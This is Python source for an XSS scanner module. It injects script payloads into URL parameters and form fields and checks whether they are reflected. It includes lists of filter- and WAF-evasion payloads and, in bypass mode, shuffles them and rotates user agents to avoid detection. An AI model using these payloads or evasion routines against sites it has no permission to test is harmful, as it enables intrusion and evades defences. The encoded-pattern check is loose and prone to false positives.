import logging
import random
from urllib.parse import urlparse, parse_qs, quote
from ..http_client import HttpClient
import re
from typing import List, Dict, Optional, Union

logger = logging.getLogger(__name__)

class XSSScanner:
    def __init__(self, client=None):
        self.client = client if client else HttpClient()
        
        # Standard XSS payloads
        self.standard_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "'><script>alert('XSS')</script>",
            "\"><script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "onmouseover=alert('XSS')",
            "onerror=alert('XSS')",
            "<a href=javascript:alert('XSS')>XSS</a>",
            "<body onload=alert('XSS')>"
        ]
        
        # WAF evasion payloads
        self.waf_evasion_payloads = [
            # HTML entity encoding
            "&#x3C;script&#x3E;alert('XSS')&#x3C;/script&#x3E;",
            # JavaScript escaping
            "\x3Cscript\x3Ealert('XSS')\x3C/script\x3E",
            # Mixed case to bypass regex filters
            "<ScRiPt>alert('XSS')</sCrIpT>",
            # Splitting strings
            "<img src=x onerror=\"al\u0065rt('XSS')\">\u0000",
            # Nested vectors
            "<iframe src=\"javascript:eval(`alert('XSS')`)\"></iframe>",
            # DOM-based XSS
            "<div id=\"test\" onmouseover=\"alert('XSS')\">Hover here</div>",
            # Exotic vectors
            "<svg><animate onbegin=alert('XSS') attributeName=x></animate></svg>",
            # Obfuscated event handlers
            "<img src=x on\x65rror=alert('XSS')>",
            # Non-standard attributes
            "<x oncopy=alert('XSS')>Copy this</x>",
            # Unusual tags
            "<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert('XSS')>--></mglyph></table></mtext></math>"
        ]
        
        # Use standard payloads by default
        self.payloads = self.standard_payloads
        self.encoding_patterns = [
            r'&lt;script&gt;',
            r'&lt;img',
            r'&lt;svg',
            r'&lt;a',
            r'&lt;body',
            r'&amp;lt;script&amp;gt;',
            r'&amp;lt;img',
            r'&amp;lt;svg',
            r'&amp;lt;a',
            r'&amp;lt;body'
        ]

    def scan(self, url: str, forms: Optional[List[Dict]] = None, waf_bypass: bool = False) -> List[Dict]:
        vulnerabilities = []
        
        # Enable WAF bypass mode if requested
        if waf_bypass and isinstance(self.client, HttpClient):
            self.client.enable_waf_bypass(True)
            # Use WAF evasion payloads
            self.payloads = self.standard_payloads + self.waf_evasion_payloads
            # Randomize the order to avoid pattern detection
            random.shuffle(self.payloads)
        else:
            # Use standard payloads
            self.payloads = self.standard_payloads
        
        try:
            # Check URL parameters
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            
            if params:
                for param in params:
                    for payload in self.payloads:
                        try:
                            # Apply WAF bypass techniques to payload if enabled
                            if waf_bypass and isinstance(self.client, HttpClient):
                                bypass_payload = self.client.apply_payload_bypass(payload, 'xss')
                            else:
                                bypass_payload = payload
                                
                            test_url = self._inject_payload(url, param, bypass_payload)
                            
                            # Add random headers if WAF bypass is enabled
                            if waf_bypass and isinstance(self.client, HttpClient):
                                # Set a random user agent for each request
                                self.client.set_random_user_agent()
                                response = self.client.get(test_url, timeout=10)
                            else:
                                response = self.client.get(test_url, timeout=10)
                            
                            if response and self._is_vulnerable(response.text, payload):
                                vulnerabilities.append({
                                    'type': 'XSS',
                                    'url': test_url,
                                    'payload': payload,
                                    'evidence': self._get_evidence(response.text, payload),
                                    'severity': 'high',
                                    'param': param,
                                    'method': 'GET'
                                })
                        except Exception as e:
                            logger.error(f"XSS GET scan error for {url}: {str(e)}")
            
            # Check forms
            if forms:
                for form in forms:
                    try:
                        form_fields = form.get('fields', [])
                        if not isinstance(form_fields, list):
                            logger.warning(f"Invalid form fields type: {type(form_fields)}")
                            continue
                        
                        method = form.get('method', 'POST').upper()
                        action = form.get('action', '')
                        if not action:
                            logger.warning("Form has no action URL")
                            continue
                        
                        for field in form_fields:
                            for payload in self.payloads:
                                try:
                                    # Apply WAF bypass techniques to payload if enabled
                                    if waf_bypass and isinstance(self.client, HttpClient):
                                        bypass_payload = self.client.apply_payload_bypass(payload, 'xss')
                                    else:
                                        bypass_payload = payload
                                        
                                    test_data = {}
                                    for f in form_fields:
                                        field_name = f.get('name') if isinstance(f, dict) else f
                                        test_data[field_name] = bypass_payload if f == field else 'test'
                                    
                                    # Add random headers if WAF bypass is enabled
                                    if waf_bypass and isinstance(self.client, HttpClient):
                                        # Set a random user agent for each request
                                        self.client.set_random_user_agent()
                                        
                                    if method == 'POST':
                                        response = self.client.post(action, data=test_data, timeout=10)
                                    elif method == 'GET':
                                        response = self.client.get(action, params=test_data, timeout=10)
                                    else:
                                        logger.warning(f"Unsupported form method: {method}")
                                        continue
                                    
                                    if response and self._is_vulnerable(response.text, payload):
                                        vulnerabilities.append({
                                            'type': 'XSS',
                                            'url': action,
                                            'payload': payload,
                                            'evidence': self._get_evidence(response.text, payload),
                                            'severity': 'high',
                                            'param': field,
                                            'method': method
                                        })
                                except Exception as e:
                                    logger.error(f"XSS form scan error for field {field}: {str(e)}")
                    except Exception as e:
                        logger.error(f"XSS form scan error: {str(e)}")
        
        except Exception as e:
            logger.error(f"XSS scan error: {str(e)}")
        
        # Disable WAF bypass mode after scan if it was enabled
        if waf_bypass and isinstance(self.client, HttpClient):
            self.client.enable_waf_bypass(False)
            
        return vulnerabilities

    def _inject_payload(self, url: str, param: str, payload: str) -> str:
        parsed = urlparse(url)
        query = parse_qs(parsed.query)
        query[param] = [payload]
        new_query = '&'.join(f"{k}={quote(v[0])}" for k, v in query.items())
        return f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"

    def _is_vulnerable(self, response_text: str, payload: str) -> bool:
        # Check if payload appears in response without proper encoding
        if payload in response_text:
            return True
            
        # Check for encoded versions of the payload
        for pattern in self.encoding_patterns:
            if re.search(pattern, response_text, re.IGNORECASE):
                return True
                
        return False

    def _get_evidence(self, response_text: str, payload: str) -> str:
        if payload in response_text:
            return "XSS payload found in response without encoding"
            
        for pattern in self.encoding_patterns:
            if re.search(pattern, response_text, re.IGNORECASE):
                return f"Encoded XSS payload found in response: {pattern}"
                
        return "XSS vulnerability detected through response analysis"